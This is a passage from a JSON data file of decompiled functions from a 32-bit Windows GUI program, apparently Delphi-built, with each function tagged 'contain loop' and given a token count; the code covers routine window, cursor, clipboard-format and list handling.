        "decompiled_code": "\nvoid fcn.00419008(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    \n    puStack12 = 0x419018;\n    fcn.00418c24();\n    uStack16 = 0x41906d;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puStack12 = &stack0xfffffffc;\n    while( true ) {\n        cVar1 = fcn.00418c48();\n        if (cVar1 != '\\0') break;\n        fcn.00418c30();\n        if (in_EAX == *0x417510) break;\n        in_EAX = fcn.004045dc();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x419074;\n    uStack16 = 0x41906c;\n    fcn.00418cdc();\n    return;\n}\n",
        "token_count": 231
    },
    "00419514": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00419514(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.00407688();\n    iVar1 = *(*(iVar1 + 8) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.00419888();\n            (**(*piVar2 + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "004198e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004198e4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "0041cec8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041cec8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar1 = *(*(in_EAX + 0x30) + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.00419888();\n                fcn.00404650();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00404650();\n        *(in_EAX + 0x30) = 0;\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "0041d200": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d200(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040676c();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419730();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "004201f8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004201f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x1c) & 8) == 0) {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 8;\n        if ((*(in_EAX + 0x10) != 0) && (iVar1 = *(*(in_EAX + 0x10) + 8),  -1 < iVar1 + -1)) {\n            do {\n                fcn.00419888();\n                fcn.004201f8();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00420978": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420978(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((arg_8h != in_EAX[0x10]) || (arg_ch != in_EAX[0x11])) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00419888(arg_8h, arg_ch);\n                (**(*piVar1 + 0x10))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x10] = arg_8h;\n        in_EAX[0x11] = arg_ch;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "004209f4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004209f4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x50) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00419888();\n            if (param_2 == iVar1) {\n                *(param_2 + 0x10) = 0;\n                fcn.0041977c();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "00420f68": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00420f68(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x420f78;\n    iVar1 = fcn.00419bf8();\n    uStack24 = 0x420fbd;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8);\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419888();\n            fcn.00404650();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x420fc4;\n    uStack24 = 0x420fbc;\n    fcn.00419c5c();\n    return;\n}\n",
        "token_count": 228
    },
    "0042d4c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042d4c0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00419888();\n            (**(**(iVar1 + 4) + 0x28))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00431934": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00431934(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x431944;\n    (**(**(arg_8h + -4) + 0x18))();\n    uStack20 = 0x4319a3;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack28 = 0;\n    puStack16 = &fcn.00431934::var_1h + 1;\n    uVar2 = sub.user32.dll_EnumClipboardFormats();\n    while ((uVar2 != 0 && (cVar1 = fcn.00427480(),  cVar1 == '\\0'))) {\n        uStack28 = uVar2;\n        uVar2 = sub.user32.dll_EnumClipboardFormats();\n    }\n    *in_FS_OFFSET = uStack28;\n    uStack20 = 0x4319aa;\n    uStack24 = 0x4319a2;\n    (**(**(arg_8h + -4) + 0x14))();\n    return;\n}\n",
        "token_count": 317
    },
    "00434964": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434964(uint8_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00436510();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if (iVar3 < param_2) {\n                iVar2 = fcn.00436520();\n                if (param_1 < *(iVar2 + 0x3f)) {\n                    fcn.00433a04();\n                }\n            }\n            else {\n                iVar2 = fcn.00436520();\n                if (*(iVar2 + 0x3f) <= param_1 && param_1 != *(iVar2 + 0x3f)) {\n                    iVar2 = fcn.00436520();\n                    *(iVar2 + 0x3f) = param_1;\n                }\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "004365d8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004365d8(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00436510();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00436520();\n            (*arg_8h)();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00436a3c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00436a3c(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.00436510();\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.00436520();\n            (**(*piVar2 + 0x40))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00436ad0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00436ad0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        in_EAX = *(iVar1 + 100);\n    } while (in_EAX != 0);\n    return *(iVar1 + 0x70);\n}\n",
        "token_count": 74
    },
    "00437d5c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437d5c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    for (; (0 < param_2 && (in_EAX != 0)); in_EAX = *(in_EAX + 100)) {\n        param_2 = param_2 + -1;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "004390e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004390e0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            piVar1 = fcn.00419888();\n            if (param_2 == *piVar1) {\n                puVar2 = fcn.00419888();\n                *puVar2 = 0;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "0043b954": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043b954(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != NULL) {\n        do {\n            iVar1 = sub.user32.dll_IsWindow(in_EAX[1]);\n            if (iVar1 != 0) {\n                sub.user32.dll_EnableWindow(in_EAX[1], 0xffffffff);\n            }\n            in_EAX = *in_EAX;\n            fcn.00402f1c();\n        } while (in_EAX != NULL);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0043f564": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0043f564(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = fcn.00458568(2);\n    iVar2 = (***0x4924d8)(uVar1);\n    iVar3 = fcn.00443d44();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.00443d30();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.00443d30();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00444c1c();\n    iVar3 = fcn.00443d44();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.00443d30();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.00443d30();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 279
    },
    "00440fe8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440fe8(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        do {\n            iVar3 = param_2;\n            param_2 = *(iVar3 + 0x30);\n            if (param_2 == 0) break;\n            cVar1 = fcn.004047dc();\n        } while (cVar1 == '\\0');\n        if ((iVar3 != 0) && (param_1 != iVar3)) {\n            uVar2 = fcn.00458568();\n            sub.user32.dll_SendMessageA(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00443ee0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00443ee0(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    puVar1 = *(in_EAX + 0x5c);\n    while (puVar1 != NULL) {\n        iVar2 = puVar1[1];\n        if ((((-0x12 < iVar2) && (iVar2 < -0xb)) || (iVar2 == -0x15)) || (0 < iVar2)) {\n            sub.user32.dll_DestroyCursor();\n        }\n        puVar1 = *puVar1;\n        fcn.00402f1c();\n    }\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    if (iVar2 != *(in_EAX + 0x60)) {\n        sub.user32.dll_DestroyCursor(*(in_EAX + 0x60));\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "00444be4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00444be4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(*(in_EAX + 0x58) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419888();\n            fcn.00404650();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    (**(**(*0x497c20 + 0x58) + 8))();\n    return;\n}\n",
        "token_count": 124
    },
    "00444c40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00444c40(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.00443d44();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00443d30();\n            cVar1 = fcn.00443aa4();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.00443d30();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00444c1c();\n    iVar2 = fcn.00443d44();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00443d30();\n            cVar1 = fcn.00443aa4();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.00443d30();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 254
    },
    "004453b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004453b0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00406774();\n    if (-1 < iVar1) {\n        iVar1 = iVar1 + 1;\n        iVar2 = 0;\n        do {\n            if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n                *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = 0;\n                *(*(in_EAX + 0xd0) + iVar2 * 0xc) = 0xffffffff;\n                return;\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "00446d5c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00446d5c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    iVar2 = fcn.00443d90();\n    if (-1 < iVar2 + -1) {\n        do {\n            piVar3 = fcn.00443d7c();\n            cVar1 = fcn.00458874();\n            if (cVar1 != '\\0') {\n                uVar4 = fcn.00458568();\n                iVar5 = sub.user32.dll_IsWindowVisible(uVar4);\n                if (iVar5 != 0) {\n                    uVar4 = fcn.00458568();\n                    iVar5 = sub.user32.dll_IsWindowEnabled(uVar4);\n                    if (iVar5 != 0) {\n                        (**(*piVar3 + 0xec))();\n                    }\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "00446fa8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00446fa8(void)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    iVar1 = fcn.00443d74();\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00443d60();\n            fcn.00451abc(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00447d40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00447d40(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetCapture();\n    if (iVar1 == 0) {\n        iVar1 = *(in_EAX + 0x44);\n        if ((iVar1 == 0) || (*param_2 != *(iVar1 + 0x29c))) {\n            iVar1 = fcn.0044d264();\n            while ((iVar1 == 0 && (iVar2 = sub.user32.dll_GetParent(),  iVar2 != 0))) {\n                iVar1 = fcn.0044d264();\n            }\n        }\n        if (iVar1 != 0) {\n            uVar3 = fcn.0040484c();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 213
    },
    "0044907c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044907c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 0x4c) != 0) && (iVar2 = *(*(in_EAX + 0x4c) + 8),  -1 < iVar2 + -1)) {\n        do {\n            iVar1 = fcn.00419888();\n            if (param_2 == iVar1) {\n                *(param_2 + 4) = 0;\n                fcn.0041977c();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "0044a6bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a6bc(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.00405974(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x4c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00405584();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0044a9c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a9c0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != in_EAX[0x20]) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x6c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x20] = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0044aa1c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044aa1c(uint param_1, int16_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x21)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x70))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x21) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "0044aa80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044aa80(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x86)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x74))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x86) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0044ac18": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044ac18(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iStack20 = -1;\n    iVar3 = (**(*in_EAX + 0x14))();\n    iVar1 = iStack20;\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            iVar2 = (**(*in_EAX + 0x18))();\n            iVar1 = iVar4;\n            if (param_2 == iVar2) break;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n            iVar1 = iStack20;\n        } while (iVar3 != 0);\n    }\n    iStack20 = iVar1;\n    return CONCAT44(iStack20, iStack20);\n}\n",
        "token_count": 220
    },
    "0044d684": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0044d684(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    *param_1 = 0;\n    bVar2 = false;\n    while( true ) {\n        if (*(in_EAX + 8) <= *param_1) {\n            return bVar2;\n        }\n        iVar1 = fcn.00419888();\n        bVar2 = param_2 == *(iVar1 + 4);\n        if (bVar2) break;\n        *param_1 = *param_1 + 1;\n    }\n    return bVar2;\n}\n",
        "token_count": 155
    },
    "0044d6bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044d6bc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = fcn.00458568();\n    iVar2 = iVar3;\n    while (iVar1 = iVar3,  iVar1 != 0) {\n        iVar3 = sub.user32.dll_GetParent();\n        iVar2 = iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 104
    },
    "0044d7a0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044d7a0(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iVar4 = 0;\n    if (*(in_EAX + 8) != 0) {\n        if (*(in_EAX + 8) == 1) {\n            iStack20 = 0x44d7bb;\n            piVar2 = fcn.00419888();\n            iVar4 = *piVar2;\n        }\n        else {\n            iStack20 = sub.user32.dll_GetDesktopWindow(param_1);\n            iVar3 = sub.user32.dll_GetTopWindow();\n            while ((iVar4 == 0 && (iVar3 != 0))) {\n                cVar1 = fcn.0044d684();\n                if (cVar1 == '\\0') {\n                    iVar3 = func_0x004081d8(iVar3, 2);\n                }\n                else {\n                    iVar4 = **(*(in_EAX + 4) + iStack20 * 4);\n                }\n            }\n        }\n    }\n    return CONCAT44(iStack20, iVar4);\n}\n",
        "token_count": 275
    },
    "0044e224": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044e224(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    while ((iVar2 != 0 && (cVar1 = fcn.0044e1c4(),  cVar1 == '\\0'))) {\n        iVar2 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 109
    },
    "0044ed48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044ed48(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    iVar2 = 0;\n    while ((iVar1 != 0 && (iVar2 = fcn.0044d264(),  iVar2 == 0))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 113
    },
    "00450370": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00450370(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\n                fcn.00440ef0();\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "004543c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004543c0(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    for (; (param_2 != 0 && (in_EAX != param_2)); param_2 = *(param_2 + 0x30)) {\n    }\n    return in_EAX & 0xffffff00 | param_2 != 0;\n}\n",
        "token_count": 91
    },
    "00454d54": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00454d54(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004198e4();\n    iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1;\n    if (iVar1 + 1 <= iVar2) {\n        iVar1 = (iVar2 - (iVar1 + 1)) + 1;\n        do {\n            iVar2 = fcn.00419888();\n            if (*(iVar2 + 0x1b4) != 0) {\n                return *(iVar2 + 0x1b4);\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 181
    },
    "00459908": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459908(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xdfff;\n    }\n    else {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x2000;\n    }\n    if ((*(in_EAX + 0x1d0) != 0) && (iVar1 = *(*(in_EAX + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        do {\n            fcn.00419888();\n            fcn.00459908();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "0045a40c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045a40c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == 0) {\n            return 0;\n        }\n        cVar1 = fcn.0045a4a8();\n        if (cVar1 != '\\0') break;\n        in_EAX = *(in_EAX + 0xc);\n    }\n    return in_EAX;\n}\n",
        "token_count": 104
    },
    "0045a470": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045a470(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 94
    },
    "0045a484": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045a484(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = fcn.0045aacc();\n    while (iVar1 != 0) {\n        iVar1 = fcn.0045aaa4();\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 88
    },
    "0045a4a8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar fcn.0045a4a8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    if (*(in_EAX + 4) == 0) {\n        for (iVar2 = fcn.0045aacc(); iVar2 != 0; iVar2 = *(iVar2 + 0xc)) {\n            cVar1 = fcn.0045a4a8();\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(in_EAX + 4) + 0x57);\n    }\n    return uVar3;\n}\n",
        "token_count": 166
    },
    "0045a81c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045a81c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x14);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.0045aaa4();\n        if (iVar2 != 0) break;\n        iVar1 = *(iVar1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 123
    },
    "0045a9f4": {
        "rules": [
            "contain loop"
        ],
